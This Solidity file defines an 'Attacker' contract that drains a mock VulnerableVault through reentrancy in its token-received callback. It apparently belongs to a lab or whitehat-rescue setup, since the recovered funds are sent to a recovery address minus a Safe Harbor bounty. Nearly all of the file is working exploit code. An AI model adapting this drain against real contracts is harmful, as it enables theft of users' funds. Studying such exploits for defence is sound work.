// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ITokenReceiver} from "./MockToken.sol";

interface IVulnerableVault {
    function deposit(uint256 amount) external;
    function withdrawAll() external;
    function getBalance(address user) external view returns (uint256);
}

interface IMintable {
    function mint(address to, uint256 amount) external;
}

/// @title Attacker
/// @notice Exploits the CEI violation in VulnerableVault via reentrancy.
///
/// @dev ATTACK FLOW
///      1. Mint seed tokens (MockToken is publicly mintable)
///      2. Deposit seed tokens into VulnerableVault
///      3. Call withdrawAll() — vault transfers tokens, triggering onTokenReceived
///      4. In onTokenReceived, call withdrawAll() again (balance not cleared yet)
///      5. Repeat until vault is empty
///      6. Distribute recovered funds per Safe Harbor bounty terms
contract Attacker is ITokenReceiver {
    IVulnerableVault public immutable vault;
    IERC20 public immutable token;
    address public immutable recoveryAddress;
    uint256 public immutable bountyBps; // basis points: 1000 = 10%
    address public immutable owner;

    bool private _attacking;

    constructor(
        address _vault,
        address _token,
        address _recoveryAddress,
        uint256 _bountyBps
    ) {
        vault = IVulnerableVault(_vault);
        token = IERC20(_token);
        recoveryAddress = _recoveryAddress;
        bountyBps = _bountyBps;
        owner = msg.sender;
    }

    /// @notice Called by MockToken.transfer() when this contract receives tokens.
    ///         This is the re-entry point — keep draining while the vault has funds.
    function onTokenReceived(address, uint256) external override {
        if (_attacking && token.balanceOf(address(vault)) > 0) {
            vault.withdrawAll();
        }
    }

    /// @notice Execute the reentrancy attack.
    /// @param seedAmount Tokens to deposit as the initial attack seed.
    function attack(uint256 seedAmount) external {
        require(msg.sender == owner, "Attacker: only owner");

        // Mint seed tokens — MockToken allows anyone to mint
        IMintable(address(token)).mint(address(this), seedAmount);

        _attacking = true;

        // Deposit seed tokens to establish a vault balance
        token.approve(address(vault), seedAmount);
        vault.deposit(seedAmount);

        // First withdrawal triggers the reentrancy chain via onTokenReceived
        vault.withdrawAll();

        _attacking = false;

        // ── Safe Harbor fund distribution ──────────────────────────────────
        // Return recovered funds to the protocol's recovery address,
        // keeping only the agreed bounty percentage.
        uint256 total = token.balanceOf(address(this));
        uint256 bounty = (total * bountyBps) / 10_000;
        uint256 toReturn = total - bounty;

        token.transfer(recoveryAddress, toReturn);
        token.transfer(owner, bounty);
    }
}
